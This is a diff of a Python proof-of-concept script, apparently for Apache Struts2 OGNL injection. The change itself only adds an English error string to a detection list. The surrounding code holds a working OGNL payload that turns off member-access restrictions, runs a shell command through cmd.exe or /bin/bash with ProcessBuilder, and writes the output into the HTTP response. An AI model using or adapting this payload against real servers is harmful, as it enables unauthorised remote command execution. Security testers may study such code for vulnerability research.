@@ -5,7 +5,6 @@ import random
 warnings.filterwarnings("ignore")
 
 
-
 def poc(url):
     timeout = 5
     proxies = {'http': '127.0.0.1:9999'}
@@ -13,7 +12,7 @@ def poc(url):
     ran_b = random.randint(1000000, 2000000)
     ran_check = ran_a - ran_b
     ran_number = '${%d-%d}' % (ran_a, ran_b)
-    check = [ran_check, '无法初始化设备 PRN', '??????? PRN']
+    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', 'Unable to initialize device PRN']
     poc_goop = [
         r"${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='print goop').(#iswin=(@\u006Aava.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
         ran_number
